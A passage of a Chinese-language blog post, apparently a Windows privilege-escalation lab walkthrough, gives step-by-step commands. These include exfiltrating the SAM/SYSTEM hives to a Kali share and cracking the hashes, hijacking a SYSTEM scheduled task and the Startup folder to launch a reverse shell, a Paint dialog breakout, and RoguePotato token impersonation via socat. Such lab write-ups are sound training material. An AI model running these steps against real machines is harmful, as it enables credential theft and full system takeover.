+<p>) 3 - 安全帐户管理器 (SAM)</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526095641426.png" alt="image-20220526095641426"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将 SAM 和 SYSTEM 文件传输到您的 Kali VM：</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SAM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SYSTEM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"></span><br><span class="line"># 在 Kali 上，克隆 creddump7 存储库（Kali 上的存储库已过时，无法正确转储 Windows <span class="number">10</span> 的哈希值！）并使用它从 SAM 和 SYSTEM 文件中转储哈希值：</span><br><span class="line">git clone https://github.com/Tib3rius/creddump7</span><br><span class="line">pip3 install pycrypto</span><br><span class="line">python3 creddump7/pwdump.py SYSTEM SAM</span><br><span class="line"></span><br><span class="line"># 使用 hashcat 破解管理员 NTLM 哈希：</span><br><span class="line">hashcat -m <span class="number">1000</span> --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526102104852.png" alt="image-20220526102104852"></p>
+<h3 id="5-计划任务"><a href="#5-计划任务" class="headerlink" title="#5 计划任务"></a>#5 计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v		# 任务列表</span><br><span class="line">schtasks /query /fo LIST /v | <span class="built_in">find</span> &quot;Task To Run&quot;	# 过滤运行的任务文件</span><br><span class="line"></span><br><span class="line">#查看 C:\DevTools\CleanUp.ps1 脚本的内容：</span><br><span class="line"><span class="built_in">type</span> C:\DevTools\CleanUp.ps1</span><br><span class="line"></span><br><span class="line">#该脚本似乎每分钟都以 SYSTEM 身份运行。使用 accesschk.exe，请注意您可以写入此文件：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> <span class="title">user</span> <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个侦听器，然后将一行添加到<span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span> 运行您创建的 <span class="title">reverse.exe</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">echo</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &gt;&gt; <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 等待计划任务运行，这将触发反向 <span class="title">shell</span> 作为 <span class="title">SYSTEM</span>。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526133707718.png" alt="image-20220526133707718"></p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526135208329.png" alt="image-20220526135208329"></p>
+<h3 id="6-不安全的-GUI-应用程序"><a href="#6-不安全的-GUI-应用程序" class="headerlink" title="#6 不安全的 GUI 应用程序"></a>#6 不安全的 GUI 应用程序</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 桌面上有个画图程序，运行程序后输入</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 双击桌面上的“AdminPaint”快捷方式。运行后，打开命令提示符并注意 Paint 正在以管理员权限运行：</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 在画图中，单击“文件”，然后单击“打开”。在打开文件对话框中，点击导航输入并粘贴：</span><br><span class="line"><span class="function">file://<span class="title">c</span>:/<span class="title">windows</span>/<span class="title">system32</span>/<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 按 <span class="title">Enter</span> 以生成以管理员权限运行的命令提示符。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526142759387.png" alt="image-20220526142759387"></p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526142549020.png" alt="image-20220526142549020"></p>
+<h3 id="7-Startup-应用程序"><a href="#7-Startup-应用程序" class="headerlink" title="#7 Startup 应用程序"></a>#7 Startup 应用程序</h3><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526143354340.png" alt="image-20220526143354340"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用 accesschk.exe，注意 BUILTIN\Users 组可以将文件写入 StartUp 目录：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">d</span> &quot;<span class="title">C</span>:\<span class="title">ProgramData</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Start</span> <span class="title">Menu</span>\<span class="title">Programs</span>\<span class="title">StartUp</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#使用 <span class="title">cscript</span>，运行 <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span> 脚本，该脚本应该在 <span class="title">StartUp</span> 目录中为您的 <span class="title">reverse.exe</span> 可执行文件创建一个新的快捷方式：</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个监听器，然后等待管理员登录：</span></span><br><span class="line"><span class="function"># 以管理员身份运行的 <span class="title">shell</span> 应连接回您的侦听器。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526143837667.png" alt="image-20220526143837667"></p>
+<h3 id="8-令牌模拟"><a href="#8-令牌模拟" class="headerlink" title="#8 令牌模拟"></a>#8 令牌模拟</h3><p>) 1 - Rogue Potato(流氓土豆)</p>
+<p>参考文章 : <a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato</a></p>
+<p>利用详情 : <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html">https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html</a></p>
+<p>Tools : <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
+<ul>
+<li>本地服务权限账户</li>
+<li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege </li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在您的机器上运行socat重定向（替换VICTIM_IP）：</span><br><span class="line">socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:VICTIM_IP:<span class="number">9999</span></span><br><span class="line">sudo socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:<span class="number">10</span>.<span class="number">10</span>.<span class="number">79</span>.<span class="number">228</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"># 执行 PoC（替换YOUR_IP和command）：</span><br><span class="line">.\RoguePotato.exe -r YOUR_IP -e &quot;command&quot; -l <span class="number">9999</span></span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">RoguePotato.exe</span> -<span class="title">r</span> 10.11.53.68 -<span class="title">e</span> &quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>&quot; -<span class="title">l</span> 9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220527103837310.png" alt="image-20220527103837310"></p>
+<p>) 2 - PrintSpoofer</p>
+<p>漏洞详细 ： <a target="_blank" rel="noopener" href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></p>
+<p>Tools : <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
+<ul>
+<li>需要本地服务或网络服务访问</li>
+<li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li>
+</ul>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220527144905068.png" alt="image-20220527144905068"></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
